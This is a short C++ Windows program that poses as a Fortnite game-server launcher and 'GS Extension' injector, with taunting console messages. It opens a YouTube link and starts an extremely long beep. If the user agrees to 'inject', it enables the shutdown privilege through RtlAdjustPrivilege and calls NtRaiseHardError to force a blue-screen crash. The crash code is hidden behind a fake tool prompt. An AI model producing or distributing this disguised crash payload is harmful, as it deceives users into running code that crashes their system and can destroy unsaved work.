#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <cctype>

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);


int main()
{
    std::wstring onethreethreeseven = LR"(   __     ___     ___    _____
  /_ |   |__ \   |__ \  |___  |
   | |      ) |     ) |    / /
   | |     __/     __/     / /
   | |   |__ \   |__ \    / /
  |_|    |___/   |___/    /_/)";

    std::wcout << onethreethreeseven << std::endl;

    std::cout << "\nStart GS: INITIATED.\n"; // This starts the game server
    std::cout << "UD CODE: Sigma Number: " << 1337 << std::endl;

    std::cout << "Detecting Mstreem pasted code..." << std::endl;
    std::cout << "Pasted code detected." << std::endl;

    std::cout << "Finding Tutorial..." << std::endl;
    std::cout << "Found! How To Get Season 8 Fortnite in 2023!" << std::endl;

    std::cout << "Opening Tutorial..." << std::endl;
    ShellExecute(nullptr, "open", "https://www.youtube.com/watch?v=3ZeHmdJnny4", nullptr, nullptr, SW_SHOWNORMAL);

    std::cout << "Would you like to inject 1:1 1337 GS Extension? (Y/N)" << std::endl;
    char answer;

    while (true) {
        std::cin >> answer;

		Beep(1000, 50000000000); 

        answer = std::toupper(answer);

        if (answer == 'Y' || answer == 'N') { break; }

        std::cout << "Invalid input you skidder put Y or N" << std::endl;
        std::cin.clear();
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    }

    if (answer == 'Y') {
        	BOOLEAN PrivilegeState = FALSE;
	        ULONG ErrorResponse = 0;
	        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
	        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
    } else {
        std::cout << "Ok bro ur missing out" << std::endl;
    }
    
    return 0;
}

